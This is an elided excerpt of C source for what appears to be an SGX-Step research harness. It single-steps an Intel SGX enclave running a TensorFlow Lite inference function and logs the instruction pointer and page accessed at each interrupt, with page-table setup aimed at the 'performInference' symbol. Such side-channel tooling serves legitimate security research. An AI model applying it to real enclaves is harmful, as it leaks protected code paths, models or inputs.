...
void aep_cb_func(void) {
    ...
    if (a != 0){
        ...
        //info("RIP=%#09llx; PAGE=%#lx", erip, a_page);
        info("%#09llx %#lx", erip, a_page);
    }
    irq_cnt++;

    if (do_irq && (irq_cnt > 1000000)) {
        info(
...
void attacker_config_page_table(void) {
    ...
    //code_adrs += get_symbol_offset("expf");
    code_adrs += get_symbol_offset("_Z16performInferenceN6tflite16MicroInterpreterEPfmRi");
...
int main( int argc, char **argv )
{
    ...
    int apic_fd, updated = 0, vec=0;
    int enc_retval = -1;
    idt_t idt = {0};

	// Exit if no input is provided
    if (argc == 1){
        info("Must run with desired input!");
        exit(1);
    }

    // Use the /tmp/$class.txt files generated by the testing script:
    // make clean && make && ./run.sh "$(< /tmp/8.txt)"

	// convert inputs into an array!

    const int DIMSIZE = 28;
	float inputs[DIMSIZE*DIMSIZE];
    ...
    info("Performing inference %d time(s) on input array size [%d]", 1, sizeof(inputs) / sizeof(inputs[0]));
    SGX_ASSERT(entry_point(eid, &enc_retval, 1, inputs, argc-1));
    info("Result returned by enclave is %d", enc_retval);
    ...
    //info_event("calling enclave with args [%s]: num_runs=%d; timer=%d", argstring, 1, SGX_STEP_TIMER_INTERVAL);
    // trigger the function which gets single stepped, 1 times
    SGX_ASSERT(entry_point(eid, &enc_retval, 1, inputs, argc-1));
    //info("Result returned by enclave is %f", enc_retval);

    /* 3. Restore normal execution environment. */
    // Per https://github.com/jovanbulck/sgx-step/issues/90, skip the call to destroy!
    info_event("NOTE: skipping call to sgx_destroy_enclave( eid )");
